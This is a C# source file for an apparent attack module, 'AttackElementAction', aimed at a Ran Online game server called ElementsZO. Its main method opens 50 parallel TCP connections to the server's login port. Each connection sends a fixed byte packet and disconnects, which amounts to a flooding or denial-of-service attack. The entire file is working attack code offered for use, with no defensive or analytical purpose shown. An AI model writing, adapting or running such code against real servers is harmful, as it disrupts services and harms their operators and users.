using Framework;
using SimpleTCP;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;

namespace RanOnlineCore.Action.AttackAction
{
    public class AttackElementAction : CommandBase<dynamic>
    {
        private byte[] Data { get; set; }
        private List<string> Messages { get; set; }
        private ObjectContext Context { get; set; }
        private Stopwatch Watch { get; set; }
        protected override void ValidateCore(ObjectContext context)
        {
            this.Watch = new Stopwatch();
            this.Watch.Start();
            this.Context = context;
            this.Add("[STARTING...]");
            this.Messages = new List<string>();
        }
        protected override void OnExecutedCore(ObjectContext context, Result<dynamic> result)
        {
            this.Add($"[END WITH {this.Watch.ElapsedMilliseconds / 1000}s]");
        }
        protected override void OnExecutingCore(ObjectContext context)
        {
            this.Data = new byte[] { 8, 0, 35, 4, 183, 97, 0, 0 };

        }
        private void Add(string key)
        {
            this.Context.Push($"[{DateTime.Now.ToString("yyyy-MM-dd HH:mm")}]{key}");
        }
        private void Client_DataReceived(object sender, Message e)
        {
            this.Data = e.Data;
            this.Add("[RECEIVED]");
        }
        protected override Result<dynamic> ExecuteCore(ObjectContext context)
        {
            var time = DateTime.Now.AddMinutes(2);
            var current = 4;

            Parallel.For(0, 50, i =>
            {
                try
                {
                    SimpleTcpClient Client = new SimpleTcpClient();
                    Client.DataReceived += Client_DataReceived;

                    if (Client.TcpClient == null)
                    {
                        this.Add("[CONNECTING...]");
                        Client.Connect(context.ElementsZO.IP, context.ElementsZO.LoginPort);
                    }
                    if (!Client.TcpClient.Connected)
                    {
                        this.Add("[CONNECTING...]");
                        Client.DataReceived += Client_DataReceived;
                        Client.Connect(context.ElementsZO.IP, context.ElementsZO.LoginPort);
                    }
                    Client.Write(Data);
                    this.Add("[SUCCESS]");
                    Client.Disconnect();
                }
                catch (Exception ex)
                {
                    Console.Write(ex.Message);
                    this.Add($"[FAILED]");
                    --current;
                }
            });
            return Success(new
            {
                name = context.ElementsZO.Name,
                content = ObjectContext.Messages
            });
        }
    }
}
